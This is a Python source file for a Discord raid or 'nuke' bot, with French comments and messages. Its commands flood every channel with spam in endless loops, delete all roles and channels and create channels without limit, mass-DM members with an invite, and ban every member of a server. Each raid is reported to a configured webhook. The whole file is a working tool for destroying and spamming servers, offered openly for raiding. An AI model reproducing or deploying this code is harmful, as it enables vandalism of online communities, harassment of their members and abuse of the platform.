import os
import json
def clear():
    ''' [>] Entré : Rien
        [>] Sorite : Rien
        [>] Clear le terminal
    '''
    os.system("cls")
    
try:
    import discord
    from discord.ext import commands
    from discord.ext.commands import CommandNotFound
except:
    os.system("pip install discord.py")
    clear()
try:
    from colorama import init, Fore
except:
    os.system("pip install colorama")
    clear()
try:
    from requests import post
except:
    os.system("pip install requests")
try:
    from pystyle import Add, Center, Anime, Colors, Colorate, Write, System #pip install pystyle
except:
    os.system("pip install pystyle")
    clear()
  
     
####LOADING SCREEN
nuk3r = r"""	

                    ,----------------,              ,---------,
               ,-----------------------,          ,"        ,"|
             ,"                      ,"|        ,"        ,"  |
            +-----------------------+  |      ,"        ,"    |
            |  .-----------------.  |  |     +---------+      |
            |  |                 |  |  |     | -==----'|      |
            |  |  I LOVE NUKE!   |  |  |     |         |      |
            |  |  Bad command or |  |  |/----|`---=    |      |
            |  |  C:\>_          |  |  |   ,/|==== ooo |      ;
            |  |                 |  |  |  // |(((( [33]|    ,"
            |  `-----------------'  |," .;'| |((((     |  ,"
            +-----------------------+  ;;  | |         |,"
                /_)______________(_/  //'   | +---------+
        ___________________________/___  `,
       /  oooooooooooooooo  .o.  oooo /,   \,"-----------
      / ==ooooooooooooooo==.o.  ooo= //   ,`\--{)B     ,"
     /_==__==========__==_ooo__ooo=_/'   /___________,"
     `-----------------------------'
        __    __  __    __  __    __   ______   _______  
       /  \  /  |/  |  /  |/  |  /  | /      \ /       \ 
       $$  \ $$ |$$ |  $$ |$$ | /$$/ /$$$$$$  |$$$$$$$  |
       $$$  \$$ |$$ |  $$ |$$ |/$$/  $$ ___$$ |$$ |__$$ |
       $$$$  $$ |$$ |  $$ |$$  $$<     /   $$< $$    $$< 
       $$ $$ $$ |$$ |  $$ |$$$$$  \   _$$$$$  |$$$$$$$  |
       $$ |$$$$ |$$ \__$$ |$$ |$$  \ /  \__$$ |$$ |  $$ |
       $$ | $$$ |$$    $$/ $$ | $$  |$$    $$/ $$ |  $$ |
       $$/   $$/  $$$$$$/  $$/   $$/  $$$$$$/  $$/   $$/ 
                                                  
                                                  
                                                  
                                                         
"""[1:]
System.Clear()
System.Title("NFT | Bot | By : 2$.py#6495")
System.Size(140, 45)

Anime.Fade(Center.Center(nuk3r), Colors.green_to_white, Colorate.Vertical, enter=True)

####LOAD CONFIGS
with open("config.json","r") as config:
    configs = json.load(config)

intents = discord.Intents().all()
bot = commands.Bot(configs["prefix_bot"], intents = intents)

bot.remove_command("help") #REMOVE THE HELP COMMAND !

####SEND IN CMD THE CONFIGS OF THE BOT
@bot.event
async def on_ready():
    ready = {
    "username" : "NUK3 BOT",
    "avatar_url" : "https://cdn.discordapp.com/icons/882978672204734466/36bf1c5a7e60a7cbb7d954184b5f36b5.png?size=4096"
    }
    ready["embeds"] = [
    {
        "description" : f"**Le script est connecté au bot :** `{bot.user}`\n\n**Configuration :**\n--> Nuk3 by : `{configs['raid_by']}`\n--> Discord Invite : `{configs['serv_invite']}`\n\n**Support :** [Join discord](https://discord.gg/3JWKnxydHz)",
        "title" : "[>] **Le bot est en ligne !**",
        "thumbnail" : {
            "url" : f"https://cdn.discordapp.com/icons/882978672204734466/36bf1c5a7e60a7cbb7d954184b5f36b5.png?size=4096"
            },
        "footer" : {
            "text" : "Merci d'utiliser le bot ! Cela me donne de la force ! Bon ra1d."
        }}] 
    print(f"{Fore.GREEN}===============================")
    print(f"{Fore.WHITE}[{Fore.GREEN}={Fore.WHITE}] Connecté à {bot.user} !")
    print(f"{Fore.WHITE}[{Fore.GREEN}>{Fore.WHITE}] Configuration :")
    print(f"--> Raid by : {configs['raid_by']}")
    print(f"--> Message à spam : {configs['message_spam']}")
    print(f"{Fore.GREEN}===============================")
    post(configs["webhookurl"], json = ready)
    
    
    
    
####SPAM ALL CHANNEL IN CTX.GUILD USING MESSAGE IN CONFIG.JSON
@bot.command()
async def spam(ctx):
    spamc = {
    "username" : "NUK3 BOT",
    "avatar_url" : "https://cdn.discordapp.com/icons/882978672204734466/36bf1c5a7e60a7cbb7d954184b5f36b5.png?size=4096"
    }
    spamc["embeds"] = [
    {
        "description" : f"**La commande spam a été exécuté par :** `{ctx.author.name}`\n\n**Serveur Info :**\n--> Nom : `{ctx.guild.name}`\n--> Membre : `{len(ctx.guild.members)}`\n\n**Support :** [Join discord](https://discord.gg/3JWKnxydHz)",
        "title" : "[>] **Le bot a spam un serveur !**",
        "thumbnail" : {
            "url" : f"https://cdn.discordapp.com/icons/882978672204734466/36bf1c5a7e60a7cbb7d954184b5f36b5.png?size=4096"
            },
        "footer" : {
            "text" : "Merci d'utiliser le bot ! Cela me donne de la force ! Bon ra1d."
        }}] 
    print(f"{Fore.WHITE}[{Fore.GREEN}>{Fore.WHITE}] Commande spam exécuté sur {ctx.guild.name} !")
    post(configs["webhookurl"], json = spamc)
    try:
        while True:
            for channel in ctx.guild.text_channels:
                z = await channel.send(configs["message_spam"])
                print(f"{Fore.WHITE}[{Fore.YELLOW}-{Fore.WHITE}] Salon spam : {channel.name} | {configs['message_spam']}")
    except Exception as err:
        print(f"{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}] Une erreur est survenue >>> {err}")
        
        
        
####COMMANDE NUK3, DELETE ALL CHANNEL, AND CREATE ILLIMITED OF CHANNEL
@bot.command()
async def nuk3(ctx):
    nuk3on = True
    nuk3c = {
    "username" : "NUK3 BOT",
    "avatar_url" : "https://cdn.discordapp.com/icons/882978672204734466/36bf1c5a7e60a7cbb7d954184b5f36b5.png?size=4096"
    }
    nuk3c["embeds"] = [
    {
        "description" : f"**La commande nuk3 a été exécuté par :** `{ctx.author.name}`\n\n**Serveur Info :**\n--> Nom : `{ctx.guild.name}`\n--> Membre : `{len(ctx.guild.members)}`\n\n**Support :** [Join discord](https://discord.gg/3JWKnxydHz)",
        "title" : "[>] **Le bot a nuk3 un serveur !**",
        "thumbnail" : {
            "url" : f"https://cdn.discordapp.com/icons/882978672204734466/36bf1c5a7e60a7cbb7d954184b5f36b5.png?size=4096"
            },
        "footer" : {
            "text" : "Merci d'utiliser le bot ! Cela me donne de la force ! Bon ra1d."
        }}] 
    print(f"{Fore.WHITE}[{Fore.GREEN}>{Fore.WHITE}] Commande nuk3 exécuté sur {ctx.guild.name} !")
    await ctx.guild.edit(name=f"NUK3 by : {configs['raid_by']}")
    post(configs["webhookurl"], json = nuk3c)
    try:
        for role in ctx.guild.roles:
            try:
                print(f"{Fore.WHITE}[{Fore.GREEN}-{Fore.WHITE}] Rôle supprimé : {role.name} | {role.id}")
                await role.delete()
            except:
                pass
        for channel in ctx.guild.channels:
            print(f"{Fore.WHITE}[{Fore.GREEN}-{Fore.WHITE}] Salon supprimé : {channel.name} | {channel.id}")
            await channel.delete()
        while True:
            x = await ctx.guild.create_text_channel(configs['channel_name'])
            print(f"{Fore.WHITE}[{Fore.YELLOW}-{Fore.WHITE}] Salon crée : {x.name} | {x.id}")
    except Exception as err:
        print(f"{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}] Une erreur est survenue >>> {err}")
 
####COMMANDE DMALL, DM ALL MEMBERS WITH UR DISCORD INVITE
@bot.command()
async def dmall(ctx):
    spampc = {
    "username" : "NUK3 BOT",
    "avatar_url" : "https://cdn.discordapp.com/icons/882978672204734466/36bf1c5a7e60a7cbb7d954184b5f36b5.png?size=4096"
    }
    spampc["embeds"] = [
    {
        "description" : f"**La commande dmall a été exécuté par :** `{ctx.author.name}`\n\n**Serveur Info :**\n--> Nom : `{ctx.guild.name}`\n--> Membre : `{len(ctx.guild.members)}`\n\n**Support :** [Join discord](https://discord.gg/3JWKnxydHz)",
        "title" : "[>] **Le bot a dm tout le serveur !**",
        "thumbnail" : {
            "url" : f"https://cdn.discordapp.com/icons/882978672204734466/36bf1c5a7e60a7cbb7d954184b5f36b5.png?size=4096"
            },
        "footer" : {
            "text" : "Merci d'utiliser le bot ! Cela me donne de la force ! Bon ra1d."
        }}] 
    print(f"{Fore.WHITE}[{Fore.GREEN}>{Fore.WHITE}] Commande dmall exécuté sur {ctx.guild.name} !")
    post(configs["webhookurl"], json = spampc)
    try:
        for member in ctx.guild.members:
            try:
                print(f"{Fore.WHITE}[{Fore.YELLOW}-{Fore.WHITE}] Message envoyé : {member.name} | {member.id} | {configs['message_members']}")
                await member.send(configs["message_members"])
            except:
                pass
    except Exception as err:
        print(f"{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}] Une erreur est survenue >>> {err}")
 

####COMMANDE CLEAN SERVER , DELETE ALL CHANNEL IN CTX.GUILD        
@bot.command()
async def cleanserver(ctx):
    print(f"{Fore.WHITE}[{Fore.GREEN}>{Fore.WHITE}] Commande cleanserver exécuté sur {ctx.guild.name} !")
    try:
        for channel in ctx.guild.channels:
            await channel.delete()
        await ctx.guild.create_text_channel(f"discord_clean")
    except Exception as err:
        print(f"{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}] Une erreur est survenue >>> {err}")

####COMMANDE BAN ALL MEMBERS
@bot.command()
async def banall(ctx):
    banallc = {
    "username" : "NUK3 BOT",
    "avatar_url" : "https://cdn.discordapp.com/icons/882978672204734466/36bf1c5a7e60a7cbb7d954184b5f36b5.png?size=4096"
    }
    banallc["embeds"] = [
    {
        "description" : f"**La commande banall a été exécuté par :** `{ctx.author.name}`\n\n**Serveur Info :**\n--> Nom : `{ctx.guild.name}`\n--> Membre : `{len(ctx.guild.members)}`\n\n**Support :** [Join discord](https://discord.gg/3JWKnxydHz)",
        "title" : "[>] **Le bot a bannis tout les membres d'un serveur !**",
        "thumbnail" : {
            "url" : f"https://cdn.discordapp.com/icons/882978672204734466/36bf1c5a7e60a7cbb7d954184b5f36b5.png?size=4096"
            },
        "footer" : {
            "text" : "Merci d'utiliser le bot ! Cela me donne de la force ! Bon ra1d."
        }}] 
    print(f"{Fore.WHITE}[{Fore.GREEN}>{Fore.WHITE}] Commande banall exécuté sur {ctx.guild.name} !")
    post(configs["webhookurl"], json = banallc)
    try:
        for member in ctx.guild.members:
            await member.send(configs["serv_invite"])
            try:
                print(f"{Fore.WHITE}[{Fore.YELLOW}-{Fore.WHITE}] Membre bannis : {member.name} | {member.id}")
                await member.ban(reason=configs["serv_invite"])
            except:
                pass
    except Exception as err:
        print(f"{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}] Une erreur est survenue >>> {err}")
        

####COMMANDE NOT FOUND
@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, CommandNotFound):
        print(f"{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}] {error} !") 
    
  
####RUN THE BOT        
bot.run(configs["token"])
   
   
   